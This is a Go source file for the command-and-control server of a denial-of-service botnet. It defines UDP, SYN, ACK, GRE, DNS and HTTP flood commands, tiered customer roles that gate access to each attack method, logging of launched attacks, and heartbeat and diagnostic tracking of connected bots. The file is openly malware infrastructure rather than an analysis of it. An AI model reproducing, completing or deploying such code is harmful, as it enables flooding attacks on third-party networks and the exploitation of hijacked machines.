package main

import (
	"context"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"net"
	"os"
	"path/filepath"
	"strconv"
	"sync"
	"time"
)

// Security related types and constants
type RBACConfig struct {
	MethodPermissions map[string][]string `json:"method_permissions"`
}

var (
	rbacConfig        *RBACConfig
	rbacLock          sync.RWMutex
	connectionLimiter = make(chan struct{}, 1000)
)

type CommandType uint8

const (
	CmdUDPFlood CommandType = iota
	CmdUDPSmart
	CmdTCPFlood
	CmdSYNFlood
	CmdACKFlood
	CmdGREFlood
	CmdDNS
	CmdHTTP
	CmdStop
	CmdReinstall
)

type CommandHeader struct {
	Type     CommandType
	TargetIP [4]byte
	Port     uint16
	Duration uint32
	Reserved [16]byte
}

type RateLimitType int

const (
	RateLimitAuth RateLimitType = iota
	RateLimitAttack
	RateLimitAPI
	RateLimitCommand
	RateLimitConnection
)

type RateLimitConfig struct {
	MaxRequests int
	Window      time.Duration
	BlockTime   time.Duration
}

type RateLimitEntry struct {
	Count        int
	FirstSeen    time.Time
	LastRequest  time.Time
	BlockedUntil time.Time
	Lock         sync.Mutex
}

type RateLimiter struct {
	limits     map[RateLimitType]RateLimitConfig
	entries    map[RateLimitType]*BoundedMap // Changed to use BoundedMap
	globalLock sync.RWMutex
}

var (
	rateLimiter *RateLimiter
)

var defaultRateLimits = map[RateLimitType]RateLimitConfig{
	RateLimitAuth: {
		MaxRequests: 3,
		Window:      5 * time.Minute,
		BlockTime:   15 * time.Minute,
	},
	RateLimitAttack: {
		MaxRequests: 10,
		Window:      1 * time.Hour,
		BlockTime:   30 * time.Minute,
	},
	RateLimitAPI: {
		MaxRequests: 100,
		Window:      1 * time.Minute,
		BlockTime:   5 * time.Minute,
	},
	RateLimitCommand: {
		MaxRequests: 50,
		Window:      1 * time.Minute,
		BlockTime:   2 * time.Minute,
	},
	RateLimitConnection: {
		MaxRequests: 10,
		Window:      10 * time.Second,
		BlockTime:   1 * time.Minute,
	},
}

// Telemetry related types
type LogEntry struct {
	Timestamp time.Time   `json:"timestamp"`
	Level     string      `json:"level"`
	User      string      `json:"user,omitempty"`
	Action    string      `json:"action"`
	Details   interface{} `json:"details,omitempty"`
	IP        string      `json:"ip,omitempty"`
}

type Logger struct {
	userLogs   map[string]*os.File
	logDir     string
	lock       sync.Mutex
	systemFile *os.File
}

var globalLogger *Logger

type DiagnosticPacket struct {
	Type      uint8
	OS        [16]byte
	Arch      [8]byte
	CPU       [32]byte
	RAM       uint64
	Uptime    uint64
	Timestamp int64
	Load1     float32
	Load5     float32
	Load15    float32
	DiskUsage uint64
}

type HeartbeatManager struct {
	botLastSeen   map[string]time.Time
	botPingTimes  map[string]time.Duration
	botStatus     map[string]string
	heartbeatLock sync.RWMutex
}

var heartbeatManager = &HeartbeatManager{
	botLastSeen:  make(map[string]time.Time),
	botPingTimes: make(map[string]time.Duration),
	botStatus:    make(map[string]string),
}

// RBAC Functions
func LoadRBACConfig() error {
	file, err := os.ReadFile("data/json/rbac.json")
	if err != nil {
		defaultConfig := RBACConfig{
			MethodPermissions: map[string][]string{
				"!udpsmart":  {"Owner", "Admin", "Pro", "Basic"},
				"!udpflood":  {"Owner", "Admin", "Pro", "Basic"},
				"!tcpflood":  {"Owner", "Admin", "Pro"},
				"!synflood":  {"Owner", "Admin", "Pro"},
				"!ackflood":  {"Owner", "Admin"},
				"!greflood":  {"Owner", "Admin"},
				"!dns":       {"Owner", "Admin"},
				"!http":      {"Owner", "Admin", "Pro", "Basic"},
				"!reinstall": {"Owner"},
			},
		}
		bytes, err := json.MarshalIndent(defaultConfig, "", "  ")
		if err != nil {
			return err
		}
		if err := os.WriteFile("data/json/rbac.json", bytes, 0600); err != nil {
			return err
		}
		rbacLock.Lock()
		rbacConfig = &defaultConfig
		rbacLock.Unlock()
		return nil
	}
	var config RBACConfig
	if err := json.Unmarshal(file, &config); err != nil {
		return err
	}
	rbacLock.Lock()
	rbacConfig = &config
	rbacLock.Unlock()

	return nil
}

func (u *User) CanUseMethod(method string) bool {
	if u.Level == "Owner" {
		return true
	}
	rbacLock.RLock()
	defer rbacLock.RUnlock()
	allowedLevels, exists := rbacConfig.MethodPermissions[method]
	if !exists {
		return false
	}

	userLevel := u.GetLevel()
	for _, level := range allowedLevels {
		if GetLevelFromString(level) <= userLevel {
			return true
		}
	}

	return false
}

func GetMethodPermissions() map[string][]string {
	rbacLock.RLock()
	defer rbacLock.RUnlock()
	perms := make(map[string][]string)
	for k, v := range rbacConfig.MethodPermissions {
		perms[k] = v
	}
	return perms
}

func CheckUserRateLimit(username string, limitType RateLimitType) (bool, time.Duration) {
	return CheckRateLimit(limitType, username)
}

func GetRateLimitInfo(username string) map[string]interface{} {
	info := make(map[string]interface{})

	for limitType := range defaultRateLimits {
		remaining := GetRemainingRequests(limitType, username)
		blocked := IsCurrentlyBlocked(limitType, username)

		info[limitType.String()] = map[string]interface{}{
			"remaining": remaining,
			"blocked":   blocked,
		}
	}

	return info
}

func ResetUserRateLimits(username string) {
	for limitType := range defaultRateLimits {
		ResetRateLimit(limitType, username)
	}
}

func SetMethodPermissions(method string, levels []string) error {
	rbacLock.Lock()
	rbacConfig.MethodPermissions[method] = levels
	rbacLock.Unlock()
	bytes, err := json.MarshalIndent(rbacConfig, "", "  ")
	if err != nil {
		return err
	}
	return os.WriteFile("data/json/rbac.json", bytes, 0600)
}

func ValidateMethod(method string) bool {
	rbacLock.RLock()
	defer rbacLock.RUnlock()

	_, exists := rbacConfig.MethodPermissions[method]
	return exists
}

func GetUserLevels() []string {
	return []string{"Owner", "Admin", "Pro", "Basic"}
}

// Rate Limiting Functions
func InitRateLimiter() {
	rateLimiter = &RateLimiter{
		limits:  defaultRateLimits,
		entries: make(map[RateLimitType]*BoundedMap),
	}
	for limitType := range defaultRateLimits {
		rateLimiter.entries[limitType] = boundedRateLimitEntries[limitType]
	}
	go rateLimiter.cleanupOldEntries()
}

func CheckRateLimit(limitType RateLimitType, key string) (bool, time.Duration) {
	if rateLimiter == nil {
		return true, 0
	}
	rateLimiter.globalLock.Lock()
	defer rateLimiter.globalLock.Unlock()
	config, exists := rateLimiter.limits[limitType]
	if !exists {
		return true, 0
	}

	entryMap := rateLimiter.entries[limitType]
	entryRaw, exists := entryMap.Get(key) // Use Get method instead of direct indexing
	if !exists {
		entry := &RateLimitEntry{
			FirstSeen:   time.Now(),
			LastRequest: time.Now(),
		}
		entryMap.Set(key, entry) // Use Set method
		entryRaw = entry
	}

	entry := entryRaw.(*RateLimitEntry)
	entry.Lock.Lock()
	defer entry.Lock.Unlock()
	if time.Now().Before(entry.BlockedUntil) {
		remaining := time.Until(entry.BlockedUntil)
		return false, remaining
	}
	if time.Since(entry.FirstSeen) > config.Window {
		entry.Count = 0
		entry.FirstSeen = time.Now()
	}
	if entry.Count >= config.MaxRequests {
		entry.BlockedUntil = time.Now().Add(config.BlockTime)
		LogRateLimit(key, strconv.Itoa(int(limitType)))
		return false, config.BlockTime
	}
	entry.Count++
	entry.LastRequest = time.Now()
	return true, 0
}

func GetRemainingRequests(limitType RateLimitType, key string) int {
	if rateLimiter == nil {
		return -1
	}
	rateLimiter.globalLock.RLock()
	defer rateLimiter.globalLock.RUnlock()
	config, exists := rateLimiter.limits[limitType]
	if !exists {
		return -1
	}
	entryMap := rateLimiter.entries[limitType]
	entryRaw, exists := entryMap.Get(key) // Use Get method
	if !exists {
		return config.MaxRequests
	}
	entry := entryRaw.(*RateLimitEntry)
	entry.Lock.Lock()
	defer entry.Lock.Unlock()
	if time.Since(entry.FirstSeen) > config.Window {
		return config.MaxRequests
	}
	return config.MaxRequests - entry.Count
}

func ResetRateLimit(limitType RateLimitType, key string) {
	if rateLimiter == nil {
		return
	}
	rateLimiter.globalLock.Lock()
	defer rateLimiter.globalLock.Unlock()
	entryMap := rateLimiter.entries[limitType]
	entryMap.Delete(key) // Use Delete method instead of delete()
}

func SetRateLimitConfig(limitType RateLimitType, config RateLimitConfig) {
	if rateLimiter == nil {
		return
	}
	rateLimiter.globalLock.Lock()
	defer rateLimiter.globalLock.Unlock()
	rateLimiter.limits[limitType] = config
}

func (rl *RateLimiter) cleanupOldEntries() {
	ticker := time.NewTicker(1 * time.Minute)
	defer ticker.Stop()

	for range ticker.C {
		rl.globalLock.Lock()
		now := time.Now()
		for limitType, entryMap := range rl.entries {
			// Use Range method instead of direct iteration
			entryMap.Range(func(key string, value interface{}) bool {
				entry := value.(*RateLimitEntry)
				entry.Lock.Lock()
				if now.After(entry.BlockedUntil) && now.Sub(entry.LastRequest) > rl.limits[limitType].Window*2 {
					entryMap.Delete(key)
				}
				entry.Lock.Unlock()
				return true
			})

			// Check if map is empty using Size() instead of len()
			if entryMap.Size() == 0 {
				delete(rl.entries, limitType)
			}
		}
		rl.globalLock.Unlock()
	}
}

func (rl *RateLimiter) WithContext(ctx context.Context) {
	go func() {
		<-ctx.Done()
		rl.globalLock.Lock()
		for limitType := range rl.entries {
			// Create a new BoundedMap instead of regular map
			rl.entries[limitType] = NewBoundedMap(MaxRateLimitEntries)
		}
		rl.globalLock.Unlock()
	}()
}

func CheckAttackRateLimit(username string) (bool, time.Duration) {
	return CheckRateLimit(RateLimitAttack, username)
}

func CheckAPIRateLimit(token string) (bool, time.Duration) {
	return CheckRateLimit(RateLimitAPI, token)
}

func CheckCommandRateLimit(connID string) (bool, time.Duration) {
	return CheckRateLimit(RateLimitCommand, connID)
}

func CheckConnectionRateLimit(ip string) (bool, time.Duration) {
	return CheckRateLimit(RateLimitConnection, ip)
}

func (rlt RateLimitType) String() string {
	switch rlt {
	case RateLimitAuth:
		return "authentication"
	case RateLimitAttack:
		return "attack"
	case RateLimitAPI:
		return "api"
	case RateLimitCommand:
		return "command"
	case RateLimitConnection:
		return "connection"
	default:
		return "unknown"
	}
}

func GetRateLimitStats() map[string]interface{} {
	if rateLimiter == nil {
		return nil
	}
	rateLimiter.globalLock.RLock()
	defer rateLimiter.globalLock.RUnlock()

	stats := make(map[string]interface{})
	for limitType, entryMap := range rateLimiter.entries {
		typeStats := map[string]interface{}{
			"active_entries": entryMap.Size(), // Use Size() method
			"config":         rateLimiter.limits[limitType],
		}
		stats[limitType.String()] = typeStats
	}
	return stats
}

func IsCurrentlyBlocked(limitType RateLimitType, key string) bool {
	if rateLimiter == nil {
		return false
	}
	rateLimiter.globalLock.RLock()
	defer rateLimiter.globalLock.RUnlock()
	entryMap := rateLimiter.entries[limitType]
	entryRaw, exists := entryMap.Get(key) // Use Get method
	if !exists {
		return false
	}
	entry := entryRaw.(*RateLimitEntry)
	entry.Lock.Lock()
	defer entry.Lock.Unlock()
	return time.Now().Before(entry.BlockedUntil)
}

// Logging Functions
func InitLogger(logDir string) error {
	globalLogger = &Logger{
		userLogs: make(map[string]*os.File),
		logDir:   logDir,
	}
	if err := os.MkdirAll(logDir, 0700); err != nil {
		return err
	}
	systemLogPath := filepath.Join(logDir, "system.log")
	systemFile, err := os.OpenFile(systemLogPath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0600)
	if err != nil {
		return err
	}
	globalLogger.systemFile = systemFile
	return nil
}

func (l *Logger) Log(entry LogEntry) error {
	l.lock.Lock()
	defer l.lock.Unlock()
	var logFile *os.File
	if entry.Details != nil {
		if _, exists := l.userLogs[entry.User]; !exists {
			userLogDir := filepath.Join(l.logDir, "users")
			if err := os.MkdirAll(userLogDir, 0600); err != nil {
				return err
			}
			userLogPath := filepath.Join(userLogDir, entry.User+".log")
			userFile, err := os.OpenFile(userLogPath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0700)
			if err != nil {
				return err
			}
			l.userLogs[entry.User] = userFile
		}
		logFile = l.userLogs[entry.User]
	} else {
		logFile = l.systemFile
	}
	entry.Timestamp = time.Now()
	jsonData, err := json.Marshal(entry)
	if err != nil {
		return err
	}
	_, err = logFile.Write(append(jsonData, '\n'))
	return err
}

func (l *Logger) Close() error {
	l.lock.Lock()
	defer l.lock.Unlock()
	for user, file := range l.userLogs {
		if err := file.Close(); err != nil {
			return err
		}
		delete(l.userLogs, user)
	}
	if l.systemFile != nil {
		return l.systemFile.Close()
	}
	return nil
}

func LogSystem(level, action string, details interface{}) {
	if globalLogger == nil {
		return
	}
	entry := LogEntry{
		Level:   level,
		Action:  action,
		Details: details,
	}
	globalLogger.Log(entry)
}

func LogUser(level, user, action, ip string, details interface{}) {
	if globalLogger == nil {
		return
	}
	entry := LogEntry{
		Level:   level,
		User:    user,
		Action:  action,
		Details: details,
		IP:      ip,
	}
	globalLogger.Log(entry)
}

func LogAttack(user, method, target, port, duration, ip string) {
	details := map[string]string{
		"method":   method,
		"target":   target,
		"port":     port,
		"duration": duration,
	}
	LogUser("INFO", user, "ATTACK_LAUNCHED", ip, details)
}

func LogRateLimit(ip, reason string) {
	LogSystem("WARN", "RATE_LIMIT", map[string]string{
		"ip":     ip,
		"reason": reason,
	})
}

func LogQuotaExceeded(user, quotaType string) {
	LogUser("WARN", user, "QUOTA_EXCEEDED", "", map[string]string{
		"quota_type": quotaType,
	})
}

func LogSessionEvent(user, ip, action string) {
	LogUser("INFO", user, "SESSION_"+action, ip, nil)
}

func LogInputValidation(ip, inputType, value string) {
	LogSystem("WARN", "INPUT_VALIDATION_FAILED", map[string]string{
		"ip":         ip,
		"input_type": inputType,
		"value":      value,
	})
}

func LogAuth(user, ip string, success bool) {
	details := map[string]bool{"success": success}
	level := "INFO"
	if !success {
		level = "WARN"
	}
	LogUser(level, user, "AUTH_ATTEMPT", ip, details)
}

func LogBotConnection(ip string, connected bool) {
	action := "BOT_DISCONNECTED"
	if connected {
		action = "BOT_CONNECTED"
	}
	LogSystem("INFO", action, map[string]string{"ip": ip})
}

func LogAPIRequest(user, endpoint, ip string, success bool) {
	details := map[string]interface{}{
		"endpoint": endpoint,
		"success":  success,
	}
	level := "INFO"
	if !success {
		level = "WARN"
	}
	LogUser(level, user, "API_REQUEST", ip, details)
}

// Diagnostic Functions
func RequestDiagnostics(conn net.Conn) error {
	packet := CreatePacket(PacketTypeDiagnostic, []byte{})
	return SendPacket(conn, packet)
}

func HandleDiagnosticResponse(conn net.Conn, packet Packet) {
	if len(packet.Payload) < 101 {
		fmt.Printf("Invalid diagnostic packet size: %d\n", len(packet.Payload))
		return
	}
	var diag DiagnosticPacket
	copy(diag.OS[:], packet.Payload[0:16])
	copy(diag.Arch[:], packet.Payload[16:24])
	copy(diag.CPU[:], packet.Payload[24:56])
	diag.RAM = binary.BigEndian.Uint64(packet.Payload[56:64])
	diag.Uptime = binary.BigEndian.Uint64(packet.Payload[64:72])
	diag.Load1 = float32(binary.BigEndian.Uint32(packet.Payload[80:84])) / 100.0
	diag.Load5 = float32(binary.BigEndian.Uint32(packet.Payload[84:88])) / 100.0
	diag.Load15 = float32(binary.BigEndian.Uint32(packet.Payload[88:92])) / 100.0
	diag.DiskUsage = binary.BigEndian.Uint64(packet.Payload[92:100])
	load1Str := fmt.Sprintf("%.2f", diag.Load1)
	load5Str := fmt.Sprintf("%.2f", diag.Load5)
	load15Str := fmt.Sprintf("%.2f", diag.Load15)
	diskUsageStr := fmt.Sprintf("%d MB", diag.DiskUsage)
	systemInfo := SystemInfo{
		OS:     string(diag.OS[:]),
		Arch:   string(diag.Arch[:]),
		CPU:    string(diag.CPU[:]),
		RAM:    fmt.Sprintf("%d MB", diag.RAM),
		Uptime: fmt.Sprintf("%d seconds", diag.Uptime),
	}
	fmt.Printf("Diagnostics from %s: %s %s, %s, %s RAM, %s uptime, Load: %s/%s/%s, Disk: %s\n",
		conn.RemoteAddr(), systemInfo.OS, systemInfo.Arch,
		systemInfo.CPU, systemInfo.RAM, systemInfo.Uptime,
		load1Str, load5Str, load15Str, diskUsageStr)
}

func ScheduleDiagnosticRequests() {
	ticker := time.NewTicker(5 * time.Minute)
	defer ticker.Stop()

	for range ticker.C {
		botInfoLock.Lock()
		for _, botConn := range botConns {
			go RequestDiagnostics(botConn)
		}
		botInfoLock.Unlock()
	}
}

// Heartbeat Functions
func (hm *HeartbeatManager) UpdateBotHeartbeat(botID string, pingTime time.Duration) {
	hm.heartbeatLock.Lock()
	defer hm.heartbeatLock.Unlock()
	hm.botLastSeen[botID] = time.Now()
	hm.botPingTimes[botID] = pingTime
	if time.Since(hm.botLastSeen[botID]) > 5*time.Minute {
		hm.botStatus[botID] = "OFFLINE"
	} else if time.Since(hm.botLastSeen[botID]) > 1*time.Minute {
		hm.botStatus[botID] = "LAGGING"
	} else {
		hm.botStatus[botID] = "ONLINE"
	}
}

func (hm *HeartbeatManager) GetBotStatus(botID string) string {
	hm.heartbeatLock.RLock()
	defer hm.heartbeatLock.RUnlock()
	if status, exists := hm.botStatus[botID]; exists {
		return status
	}
	return "UNKNOWN"
}

func (hm *HeartbeatManager) GetBotPing(botID string) time.Duration {
	hm.heartbeatLock.RLock()
	defer hm.heartbeatLock.RUnlock()

	if ping, exists := hm.botPingTimes[botID]; exists {
		return ping
	}
	return 0
}

func (hm *HeartbeatManager) RemoveBot(botID string) {
	hm.heartbeatLock.Lock()
	defer hm.heartbeatLock.Unlock()
	delete(hm.botLastSeen, botID)
	delete(hm.botPingTimes, botID)
	delete(hm.botStatus, botID)
}

func (hm *HeartbeatManager) GetAllBotsStatus() map[string]string {
	hm.heartbeatLock.RLock()
	defer hm.heartbeatLock.RUnlock()
	statusCopy := make(map[string]string)
	for k, v := range hm.botStatus {
		statusCopy[k] = v
	}
	return statusCopy
}

func (hm *HeartbeatManager) CleanupInactiveBots() {
	hm.heartbeatLock.Lock()
	defer hm.heartbeatLock.Unlock()
	for botID, lastSeen := range hm.botLastSeen {
		if time.Since(lastSeen) > 10*time.Minute {
			delete(hm.botLastSeen, botID)
			delete(hm.botPingTimes, botID)
			delete(hm.botStatus, botID)
		}
	}
}

func StartHeartbeatMonitor() {
	ticker := time.NewTicker(1 * time.Minute)
	defer ticker.Stop()
	for range ticker.C {
		heartbeatManager.CleanupInactiveBots()
	}
}

func HandleBotHeartbeat(conn net.Conn, packet Packet) {
	var pingTime time.Duration
	if len(packet.Payload) >= 8 {
		pingTime = time.Duration(binary.BigEndian.Uint64(packet.Payload[0:8]))
	}
	botID := conn.RemoteAddr().String()
	heartbeatManager.UpdateBotHeartbeat(botID, pingTime)
	response := CreatePacket(PacketTypeHeartbeat, []byte{})
	SendPacket(conn, response)
}
